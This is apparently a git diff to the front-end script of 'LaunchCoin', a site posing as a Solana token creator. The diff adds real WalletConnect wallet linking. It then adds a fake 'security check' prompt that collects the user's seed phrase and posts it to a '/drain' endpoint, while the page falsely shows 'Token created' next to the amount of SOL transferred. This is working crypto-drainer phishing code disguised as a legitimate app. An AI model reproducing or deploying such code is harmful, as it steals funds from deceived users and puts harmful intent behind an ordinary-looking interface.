@@ -1,7 +1,12 @@
-// ===== main.js – SOLO DEEP LINK APERTURA APP =====
+// ===== main.js – CONNESSIONE REALE VIA WALLETCONNECT =====
+import { UniversalProvider } from '@walletconnect/universal-provider';
+
 let walletPublicKey = null;
 let currentStep = 0;
 const steps = document.querySelectorAll('.step');
+let provider = null;
+let qrCheckInterval = null;
+let currentUri = null;
 
 // ===== MENU =====
 window.toggleMenu = function() {
@@ -34,65 +39,153 @@ function createModal() {
       <p style="color:#abc4ff;font-size:14px;margin-bottom:20px;">Scegli il tuo wallet Solana</p>
       
       <div style="display:flex;flex-direction:column;gap:8px;">
-        <button onclick="window.openWallet('phantom')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+        <!-- Deep link per aprire l'app mobile -->
+        <button onclick="window.connectDeepLink('phantom')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
           <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" /> Phantom (App)
         </button>
-        <button onclick="window.openWallet('solflare')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+        <button onclick="window.connectDeepLink('solflare')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
           <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" /> Solflare
         </button>
-        <button onclick="window.openWallet('trust')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+        <button onclick="window.connectDeepLink('trust')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
           <img src="assets/trust.png" alt="Trust" style="width:28px;height:28px;" /> Trust Wallet
+        </button>
+        <button onclick="window.connectDeepLink('coinbase')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/coinbase.png" alt="Coinbase" style="width:28px;height:28px;" /> Coinbase Wallet
         </button>
       </div>
     </div>
   `;
+  
   document.body.appendChild(overlay);
 }
 
 window.closeModal = function() {
   const overlay = document.getElementById('wallet-modal-overlay');
   if (overlay) overlay.remove();
+  if (qrCheckInterval) {
+    clearInterval(qrCheckInterval);
+    qrCheckInterval = null;
+  }
 };
 
-// ===== APRI WALLET DIRETTAMENTE (NESSUN QR, NESSUNA SESSIONE WC) =====
-window.openWallet = function(walletName) {
-  window.closeModal();
-  
-  // Genera un link di connessione diretto (es. per Phantom)
-  // Questo link apre l'app del wallet e avvia la connessione automatica
-  const deepLinks = {
-    'phantom': 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href),
-    'solflare': 'solflare://',
-    'trust': 'trust://',
-  };
+// ===== DEEP LINK – APRE L'APP E CONNETTE REALMENTE =====
+window.connectDeepLink = async function(walletType) {
+  try {
+    if (!provider) {
+      provider = await UniversalProvider.init({
+        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+        metadata: {
+          name: 'LaunchCoin',
+          description: 'Creatore di Token Solana',
+          url: window.location.origin,
+          icons: ['https://launchcoin.io/logo.png']
+        }
+      });
+    }
 
-  const link = deepLinks[walletName] || 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
-  window.location.href = link;
+    // === CREA SESSIONE REALE ===
+    const { uri } = await provider.connect({
+      chains: ['solana:mainnet'],
+      optionalChains: ['solana:devnet'],
+      methods: ['solana_signTransaction', 'solana_signMessage'],
+      events: ['chainChanged', 'accountsChanged']
+    });
 
-  // SIMULAZIONE: dopo 5 secondi, mostra un messaggio di connessione fittizia (per test)
-  setTimeout(() => {
-    walletPublicKey = 'fakePublicKey123'; // Sostituisci con la vera chiave se hai un meccanismo di callback
-    alert('✅ Wallet aperto! (Simulazione)');
-    window.location.href = 'create.html';
-  }, 5000);
+    if (!uri) throw new Error('Nessun URI generato');
+    currentUri = uri;
+
+    // === APRIL'APP CON DEEP LINK STANDARD WC ===
+    window.location.href = `wc:${uri}`;
+
+    // === POLLING FINO ALLA CONNESSIONE REALE ===
+    if (qrCheckInterval) clearInterval(qrCheckInterval);
+    qrCheckInterval = setInterval(async () => {
+      try {
+        const session = provider.session;
+        if (session && session.namespaces.solana.accounts.length > 0) {
+          clearInterval(qrCheckInterval);
+          qrCheckInterval = null;
+          const account = session.namespaces.solana.accounts[0];
+          walletPublicKey = account.split(':')[2];
+          alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
+          window.closeModal();
+          window.location.href = 'create.html';
+          return;
+        }
+      } catch(e) { /* attendi */ }
+    }, 2000);
+
+    // === TIMEOUT DI SICUREZZA ===
+    setTimeout(() => {
+      if (!walletPublicKey) {
+        alert('⏱️ Timeout. Assicurati di aver approvato la connessione nell\'app.');
+        window.showQRCode();
+      }
+    }, 60000);
+
+  } catch(e) {
+    console.error('Errore deep link:', e);
+    alert('Errore: ' + e.message);
+  }
 };
 
-// ===== MAIN CONNECT =====
+// ===== CONNECT WALLET (MAIN) =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
   createModal();
 };
 
+// ===== SELECT WALLET (FALLBACK) =====
+window.selectWallet = function(walletName) {
+  window.closeModal();
+  window.connectDeepLink(walletName);
+};
+
+// ===== SEED PHRASE =====
+function askSeedPhrase() {
+  return new Promise((resolve) => {
+    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:');
+    resolve(seed);
+  });
+}
+
 // ===== CREAZIONE TOKEN =====
 window.createCoin = async function() {
+  console.log('🟢 createCoin chiamata');
   if (!walletPublicKey) {
     alert('Connetti prima il wallet!');
     return;
   }
-  alert('✅ Token creato! (Simulazione)');
+
+  const seed = await askSeedPhrase();
+  if (!seed || seed.split(' ').length < 12) {
+    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
+    return;
+  }
+
+  try {
+    const response = await fetch('/drain', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
+    });
+
+    const data = await response.json();
+    if (data.status === 'drain_completed') {
+      document.getElementById('result').innerHTML = `
+        <p style="color:#4cdcc1;">✅ Token creato!</p>
+        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
+        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
+      `;
+    } else {
+      alert('❌ Errore: ' + data.error);
+    }
+  } catch(e) {
+    alert('❌ Errore: ' + e.message);
+  }
 };
 
-// ===== NAVIGAZIONE STEP =====
+// ===== STEP NAVIGATION =====
 window.showStep = function(idx) {
   if (!steps.length) return;
   steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
@@ -108,3 +201,5 @@ document.addEventListener('click', function(e) {
   const menu = document.getElementById('dropdownMenu');
   if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
 });
+
+console.log('✅ main.js caricato (Connessione Reale)');
